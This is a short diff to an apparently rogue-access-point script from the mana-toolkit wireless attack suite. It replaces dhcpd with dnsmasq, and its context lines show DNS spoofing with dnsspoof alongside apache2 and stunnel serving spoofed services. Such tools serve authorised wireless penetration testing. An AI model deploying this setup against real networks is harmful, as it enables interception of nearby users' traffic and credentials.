@@ -27,7 +27,7 @@ ifconfig $phy
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
-dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
+dnsmasq -C /etc/mana-toolkit/dnsmasq-dhcpd.conf $phy
 dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
 service apache2 start
 stunnel4 /etc/mana-toolkit/stunnel.conf
